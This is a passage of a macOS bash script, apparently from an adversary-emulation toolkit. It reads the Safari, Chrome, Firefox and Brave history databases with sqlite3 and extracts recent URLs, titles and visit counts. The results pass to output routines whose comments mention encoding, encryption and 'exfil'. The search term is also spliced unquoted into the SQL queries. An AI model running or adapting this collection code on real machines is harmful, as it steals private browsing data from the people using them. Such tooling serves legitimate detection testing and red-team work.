        INPUT_SEARCH=""
        INPUT_LAST_DAYS=7
        START_TIME=""
        END_TIME=""
        CMD_SQLITE3="sqlite3"
        DB_HISTORY_SAFARI="$HOME/Library/Safari/History.db"
        DB_HISTORY_CHROME="$HOME/Library/Application Support/Google/Chrome/Default/History"
        CMD_QUERY_BROWSER_DB="$CMD_SQLITE3 -separator '|'"
        DB_HISTORY_BRAVE="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
        DB_HISTORY_FIREFOX="$HOME/Library/Application Support/Firefox/Profiles/*.default-release/places.sqlite"

        # Functions from YAML
        # Function: query_safari_history
        query_safari_history() {
            local search_condition=""
            [ -n "$INPUT_SEARCH" ] && search_condition="AND (hi.url LIKE '%$INPUT_SEARCH%' OR hi.domain_expansion LIKE '%$INPUT_SEARCH%' OR hv.title LIKE '%$INPUT_SEARCH%')"
        
            local query="
                WITH headers AS (
                    SELECT 'source' as source, 'domain' as domain, 'title' as title, 
                        'visit_date' as visit_date, 'url' as url, 'visit_count' as visit_count
                )
                SELECT * FROM headers
                UNION ALL
                SELECT 
                    'Safari' as source,
                    hi.domain_expansion as domain,
                    hv.title,
                    datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date,
                    hi.url,
                    hi.visit_count
                FROM history_items hi
                JOIN history_visits hv ON hi.id = hv.history_item
                WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - ($INPUT_LAST_DAYS * 86400))
                $search_condition
                ORDER BY visit_date DESC
            "
            
            core_debug_print "Executing Safari history query"
            
            local result=$(query_browser_db "$DB_HISTORY_SAFARI" "$query")
            echo "$result"
            return 0
        }

        # Function: query_chrome_history
        query_chrome_history() {
            local search_condition=""
            [ -n "$INPUT_SEARCH" ] && search_condition="AND (url LIKE '%$INPUT_SEARCH%' OR title LIKE '%$INPUT_SEARCH%')"
        
            local query="
                WITH headers AS (
                    SELECT 'source' as source, 'url' as url, 'title' as title, 
                        'visit_date' as visit_date, 'visit_count' as visit_count
                )
                SELECT * FROM headers
                UNION ALL
                SELECT 
                    'Chrome' as source,
                    url,
                    title,
                    datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit,
                    visit_count
                FROM urls
                WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_LAST_DAYS * 86400) * 1000000
                $search_condition
                ORDER BY last_visit DESC
            "
            
            core_debug_print "Executing Chrome history query"
            
            local result=$(query_browser_db "$DB_HISTORY_CHROME" "$query")
            echo "$result"
            return 0
        }

        # Function: query_firefox_history
        query_firefox_history() {
            local firefox_db=$(resolve_firefox_db)
            
            local search_condition=""
            [ -n "$INPUT_SEARCH" ] && search_condition="AND (url LIKE '%$INPUT_SEARCH%' OR title LIKE '%$INPUT_SEARCH%')"
        
            local query="
                WITH headers AS (
                    SELECT 'source' as source, 'url' as url, 'title' as title, 
                        'visit_date' as visit_date, 'visit_count' as visit_count
                )
                SELECT * FROM headers
                UNION ALL
                SELECT 
                    'Firefox' as source,
                    url,
                    title,
                    datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit,
                    visit_count
                FROM moz_places
                WHERE last_visit_date > (strftime('%s', 'now') - $INPUT_LAST_DAYS * 86400) * 1000000
                $search_condition
                ORDER BY last_visit DESC
            "
            
            core_debug_print "Executing Firefox history query"
            
            local result=$(query_browser_db "$firefox_db" "$query")
            echo "$result"
            return 0
        }

        # Function: query_brave_history
        query_brave_history() {
            local search_condition=""
            [ -n "$INPUT_SEARCH" ] && search_condition="AND (url LIKE '%$INPUT_SEARCH%' OR title LIKE '%$INPUT_SEARCH%')"
        
            local query="
                WITH headers AS (
                    SELECT 'source' as source, 'url' as url, 'title' as title, 
                        'visit_date' as visit_date, 'visit_count' as visit_count
                )
                SELECT * FROM headers
                UNION ALL
                SELECT 
                    'Brave' as source,
                    url,
                    title,
                    datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit,
                    visit_count
                FROM urls
                WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_LAST_DAYS * 86400) * 1000000
                $search_condition
                ORDER BY last_visit DESC
                LIMIT 1000
            "
            
            core_debug_print "Executing Brave history query"
            
            local result=$(query_browser_db "$DB_HISTORY_BRAVE" "$query")
            echo "$result"
            return 0
        }

        # Function: resolve_firefox_db
        resolve_firefox_db() {
            ls "$HOME/Library/Application Support/Firefox/Profiles/"*.default-release/places.sqlite 2>/dev/null | head -n 1
            return $?
        }

        # Function: query_browser_db
        query_browser_db() {
            local db="$1"
            local query="$2"
            $CMD_QUERY_BROWSER_DB "$db" "$query"
        }


        # Execute main logic
        raw_output=""

        # Execute functions for -a|--all
        if [ "$ALL" = true ]; then
            local query_safari_history_output=$(query_safari_history)
            [ -n "${query_safari_history_output}" ] && raw_output="${raw_output}${query_safari_history_output}\n"
            local query_chrome_history_output=$(query_chrome_history)
            [ -n "${query_chrome_history_output}" ] && raw_output="${raw_output}${query_chrome_history_output}\n"
            local query_firefox_history_output=$(query_firefox_history)
            [ -n "${query_firefox_history_output}" ] && raw_output="${raw_output}${query_firefox_history_output}\n"
            local query_brave_history_output=$(query_brave_history)
            [ -n "${query_brave_history_output}" ] && raw_output="${raw_output}${query_brave_history_output}\n"
        fi

        # Execute functions for -s|--safari
        if [ "$SAFARI" = true ]; then
            local query_safari_history_output=$(query_safari_history)
            [ -n "${query_safari_history_output}" ] && raw_output="${raw_output}${query_safari_history_output}\n"
        fi

        # Execute functions for -c|--chrome
        if [ "$CHROME" = true ]; then
            local query_chrome_history_output=$(query_chrome_history)
            [ -n "${query_chrome_history_output}" ] && raw_output="${raw_output}${query_chrome_history_output}\n"
        fi

        # Execute functions for -f|--firefox
        if [ "$FIREFOX" = true ]; then
            local query_firefox_history_output=$(query_firefox_history)
            [ -n "${query_firefox_history_output}" ] && raw_output="${raw_output}${query_firefox_history_output}\n"
        fi

        # Execute functions for -b|--brave
        if [ "$BRAVE" = true ]; then
            local query_brave_history_output=$(query_brave_history)
            [ -n "${query_brave_history_output}" ] && raw_output="${raw_output}${query_brave_history_output}\n"
        fi

        # Set data source
        data_source="browser_history"
        # This section is intentionally left empty as it will be filled by
        # technique-specific implementations when sourcing this base script
        # If no raw_output is set by the script, exit gracefully
        if [ -z "$raw_output" ]; then
            return 0
        fi
    fi
    
    # Process the output (format, encode, encrypt)
    processed_output=$(core_process_output "$raw_output" "$data_source")
    
    # Handle the final output (log, exfil, or display)
    core_transform_output "$processed_output"
}

# Execute main function with all arguments
# Even with no args, we want to run the main function to allow scripts
# that source this file to define their own default behavior
core_main "$@" 